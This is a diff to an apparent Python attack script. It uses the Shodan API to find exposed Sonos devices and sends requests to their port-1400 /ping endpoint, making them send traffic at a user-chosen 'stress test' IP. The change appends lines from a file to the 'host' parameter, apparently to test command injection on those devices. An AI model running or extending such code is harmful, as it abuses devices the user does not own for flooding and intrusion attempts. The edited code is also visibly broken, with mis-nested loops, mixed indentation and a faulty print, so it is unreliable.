@@ -21,6 +21,9 @@ else:
     
 host = input("Input the IP you wish to stress test.\n>")
 
+with open("listThing.txt") as f:
+    inject = f.readlines()
+
 count = 0
 
 api = shodan.Shodan(apiKey)
@@ -58,12 +61,14 @@ for service in result['matches']:
             csrf.strip()
         except:
             pass
-        dataping = {
-          'csrfToken': csrf,
-          'host': host
-        }
-        ##This is put here so I don't actually flood any networks.##
-        if count < 5:
-            count += 1
-            response = requests.post('http://'+ip+':1400/ping', headers=headersping, data=dataping)
-            print("Sonos device at IP: " + ip + ", has sent 60 packets to " + host)
+	for line in inject:
+	    host = host + line
+            dataping = {
+              'csrfToken': csrf,
+              'host': host
+            }
+            ##This is put here so I don't actually flood any networks.##
+            if count < 2:
+                count += 1
+                response = requests.post('http://'+ip+':1400/ping', headers=headersping, data=dataping)
+                print(line + " - " + response)
